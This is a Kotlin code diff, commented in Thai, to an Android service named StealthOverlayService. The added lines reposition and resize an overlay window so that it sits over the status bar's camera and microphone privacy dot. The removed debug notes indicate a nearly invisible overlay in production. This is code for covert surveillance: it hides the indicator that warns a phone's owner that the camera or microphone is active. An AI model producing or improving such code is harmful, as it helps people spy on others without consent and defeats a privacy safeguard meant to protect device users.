@@ -72,8 +72,8 @@ class StealthOverlayService : Service() {
         }
 
         val params = WindowManager.LayoutParams(
-            10, // DEBUG: 10px (เห็นด้วยตา); production = 1
-            10,
+            60, // DEBUG: 60×60 ทับ camera/mic privacy dot บน status bar
+            60,
             type,
             WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
@@ -81,9 +81,10 @@ class StealthOverlayService : Service() {
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
             PixelFormat.TRANSLUCENT,
         ).apply {
-            gravity = Gravity.TOP or Gravity.START
-            x = 50 // ห่างจากมุมซ้ายบน 50px
-            y = 50
+            // ใช้ TOP|END เพื่อให้ position สัมพันธ์กับมุมขวาบน (รองรับ จอ ต่างขนาด)
+            gravity = Gravity.TOP or Gravity.END
+            x = 30 // 30px จากขอบขวา
+            y = 15 // 15px จากด้านบน (ในระยะ status bar)
             alpha = 1.0f // DEBUG: เห็นเต็ม; production = 0.01
         }
 
